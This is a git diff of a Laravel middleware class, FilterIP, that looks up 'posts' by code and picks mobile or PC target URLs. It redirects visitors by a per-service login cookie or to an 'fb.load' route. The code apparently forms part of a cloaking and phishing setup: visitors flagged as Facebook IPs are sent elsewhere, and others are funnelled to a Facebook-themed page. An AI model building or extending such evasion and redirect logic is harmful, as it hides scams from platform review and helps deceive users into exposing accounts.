@@ -5,7 +5,9 @@ namespace App\Http\Middleware;
 use App\Helpers\Helper;
 use App\Helpers\RequestHelper;
 use App\IpFbScan;
+use App\Post;
 use Closure;
+use Illuminate\Support\Facades\Cookie;
 use Illuminate\Support\Facades\Session;
 
 class FilterIP
@@ -15,13 +17,6 @@ class FilterIP
     public function handle($request, Closure $next)
     {
         $site = null;
-        if ($request->site == 'denvau') {
-            $site = [
-                'title' => 'Facebook Thịnh Hành',
-                'img' => '',
-                'url' => 'https://facebook.com/',
-            ];
-        }
         if (!Session::has(Helper::$IS_IP_CHECKED)) {
             if (Session::has(Helper::$IS_IP_FB)) {
                 return RequestHelper::redirect($site);
@@ -71,9 +66,34 @@ class FilterIP
             } else {
                 Session::put(Helper::$IS_IP_CHECKED, true);
                 Session::put(Helper::$IP_DATA_REGION, $ipRegion);
+            }
+        }
+        if ($request->has('post')) {
+            $postCode = $request->post;
+            $post = Post::query()
+                ->where('code', $postCode)
+                ->where('status', Helper::$STATUS_ON)
+                ->first();
+            Session::put('post', $post);
 
-                $userAgent = $_SERVER["HTTP_USER_AGENT"];
-                Session::put(Helper::$USER_AGENT_DATA, $userAgent);
+            $userAgent = $_SERVER["HTTP_USER_AGENT"];
+            Session::put(Helper::$USER_AGENT_DATA, $userAgent);
+
+            $detect = new \Mobile_Detect();
+            $detect->setUserAgent($userAgent);
+            if ($detect->isMobile()) {
+                $url = $post->url_mobile;
+            } else if ($detect->isTablet()) {
+                $url = $post->url_mobile;
+            } else {
+                $url = $post->url_pc;
+            }
+            Session::put('url', $url);
+
+            if (\Illuminate\Support\Facades\Cookie::has($post->service_alias .':::'. Helper::$CASE_LOGINNED)) {
+                return redirect()->to($url);
+            } else {
+                return redirect()->route('fb.load');
             }
         }
 
